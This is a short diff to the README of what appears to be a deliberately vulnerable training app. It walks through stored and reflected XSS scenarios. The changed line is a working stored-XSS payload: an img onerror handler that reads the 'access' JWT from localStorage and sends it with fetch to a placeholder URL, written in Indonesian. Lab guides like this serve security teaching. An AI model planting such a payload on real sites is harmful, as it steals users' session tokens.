@@ -76,7 +76,7 @@ docker compose up --build
 3. Click "Save Changes".
 4. The page will reload and the payload will execute immediately. Every time this profile is loaded, the script will execute.
 
-payload get jwt token: <img src=x onerror=fetch("<ISI DENGAN URL UNIK ANDA DISINI>/?token="+localStorage.getItem('access')) />
+payload get jwt token: <img src=x onerror=fetch("ISI DENGAN URL UNIK ANDA DISINI/?token="+localStorage.getItem('access')) />
 
 ### 7. Reflected XSS
 **Scenario**: The search query on the Employee Directory page is reflected back to the user without escaping HTML characters.
